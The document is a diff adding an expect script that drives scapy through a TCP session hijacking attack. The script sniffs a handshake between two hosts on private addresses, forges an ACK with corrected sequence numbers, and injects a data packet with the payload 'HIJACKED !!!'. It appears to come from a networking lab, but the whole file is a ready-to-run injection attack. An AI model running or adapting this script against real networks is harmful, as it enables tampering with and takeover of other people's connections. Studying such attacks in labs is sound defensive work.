@@ -1,0 +1,34 @@
+#!/usr/bin/expect
+spawn "/usr/bin/scapy";
+expect ">>> ";
+
+# PAY ATTENTION TO escape the following chars: " [ and ]
+
+
+send "cap = sniff(filter=\"tcp and host 10.10.10.54 and host 20.20.20.55\", count=2) \r" 
+
+send "syn=cap\[0\].copy()\r"
+send "synack=cap\[1\].copy()\r"
+
+send "ack=syn.copy()\r"
+send "ack\[TCP\].seq=ack\[TCP\].seq+1\r"
+send "ack\[TCP\].ack=synack\[TCP\].seq+1\r"
+send "ack\[TCP\].flags=\"A\"\r"
+send "del ack\[TCP\].chksum \r"
+send "del ack\[IP\].chksum \r"
+send "sendp(ack) \r"
+
+send "data=ack.copy() \r"
+send "data=data / Raw(load=\"HIJACKED !!!\") \r"
+send "del data\[TCP\].chksum \r"
+send "del data\[IP\].chksum \r"
+send "del data\[IP\].len \r"
+send "sendp(data) \r"
+
+
+# This last command enables us to stay within scapy to type more commands
+# interactively, if we so desire.
+
+interact
+
+
